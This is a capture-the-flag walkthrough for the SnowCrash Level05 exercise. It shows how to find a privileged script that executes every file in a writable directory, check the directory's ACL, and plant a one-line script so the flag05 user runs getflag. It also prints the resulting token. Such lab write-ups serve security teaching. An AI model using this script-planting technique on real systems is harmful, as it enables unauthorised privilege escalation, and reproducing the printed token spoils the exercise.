# Level05

## Walkthrough

First, let's check if some files exist in the home directory.

```bash
level05@SnowCrash:~$ ls -la
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05  675 Apr  3  2012 .profile
```

Nothing.  
Let's try to find files owned by the `flag05` user.

```bash
level05@SnowCrash:~$ find / -type f -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:~$ cat /rofs/usr/sbin/openarenaserver 
cat: /rofs/usr/sbin/openarenaserver: Permission denied
```

We find a script `/usr/sbin/openarenaserver` which runs any other scripts found in directory `/opt/openarenaserver`, then deletes them after execution.

Let's check if we have the permissions to create a file in this directory.

```bash
level05@SnowCrash:~$ ls -la /opt | grep openarenaserver
drwxrwxr-x+ 2 root root  40 Feb  8 20:41 openarenaserver
```

The directory is owned by user `root` and group `root`, and others can only read or execute...  
But there is more: the trailing `+` character in the permissions means that the file has extended permissions ([ACL](https://en.wikipedia.org/wiki/Access-control_list)).


```bash
level05@SnowCrash:~$ getfacl /opt/openarenaserver/
getfacl: Removing leading '/' from absolute path names
# file: opt/openarenaserver/
# owner: root
# group: root
user::rwx
user:level05:rwx
user:flag05:rwx
group::r-x
mask::rwx
other::r-x
default:user::rwx
default:user:level05:rwx
default:user:flag05:rwx
default:group::r-x
default:mask::rwx
default:other::r-x
```

By reading the output of the `getfacl` command, we notice that the user `level05` has read, write and execute permissions on this directory.  
To obtain the flag, we simply have to create a shell script that will store the result of the `getflag` command in a file.

```bash
level05@SnowCrash:~$ mkdir /tmp/level05 && touch /tmp/level05/result
level05@SnowCrash:~$ chmod 666 /tmp/level05/result
level05@SnowCrash:~$ echo 'getflag > /tmp/level05/result' > /opt/openarenaserver/script.sh
```

But as seen in the previous permissions, we cannot run the `/usr/sbin/openarenaserver` script, maybe it's running on interval?  
Let's wait...  
Unfortunately, nothing happens. Seconds tick by and our script is still present and our `result` file empty. But after 5 or less minutes, our script is deleted and the output of the `getflag` command is printed inside `result`.

```bash
level05@SnowCrash:~$ cat /tmp/level05/result
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

## Resources

[What does a + mean at the end of the permissions from ls -l?](https://serverfault.com/questions/227852/what-does-a-mean-at-the-end-of-the-permissions-from-ls-l)
